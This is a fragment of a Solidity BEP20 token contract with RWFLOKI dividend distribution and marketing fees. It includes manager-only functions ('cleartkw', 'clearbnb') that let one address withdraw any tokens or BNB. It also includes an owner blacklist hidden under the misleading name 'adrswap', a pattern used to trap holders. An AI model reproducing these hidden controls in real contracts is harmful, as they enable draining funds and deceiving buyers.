...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWFLOKI = IBEP20(0xdAb529f40E671A1D4bF91361c21bf9f0C9712ab7);
    ...
    uint256 public minPeriod = 3 hours; // min 3 hour delay
    uint256 public minDistribution = 1 * (10**18); // 1 RWFLOKI minimum auto send
    uint256 public minimumTokenBalanceForDividends = 10000 * (10**6); // user must hold 0.010000 token
    ...
    function deposit() external payable override onlyToken {
        uint256 balanceBefore = RWFLOKI.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(RWFLOKI);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: msg.value
        }(0, path, address(this), block.timestamp);

        uint256 amount = RWFLOKI.balanceOf(address(this)).sub(balanceBefore);
    ...
    function distributeDividend(address shareholder) internal {
        ...
        if (amount > 0) {
            ...
            RWFLOKI.transfer(shareholder, amount);
...
contract SafeToken is Ownable {
    ...
    function cleartkw(address _token, uint256 _amount) external {
        require(msg.sender == safeManager);
        IBEP20(_token).transfer(safeManager, _amount);
    }

    function clearbnb(uint256 _amount) external {
        require(msg.sender == safeManager);
...
contract TESTAAAA is
    BASEToken("TESTAAAA", "FNFT", 100000000 * (10**9), 9),
    SafeToken,
    LockToken
{
    using SafeMath for uint256;
    ...
    constructor() {
        ...
        marketing = 0xaeBf182008AaEf74c88892e4B7a0CBda0170BA71;
    ...
    function adrswap(address adr, bool adra) external onlyOwner {
        blackList[adr] = adra;
    }
    ...
    function swapBack() internal swapping {
            ...
            )
        {
            ...
            payable(marketing).call{value: amountBNBMarketing, gas: 20000};
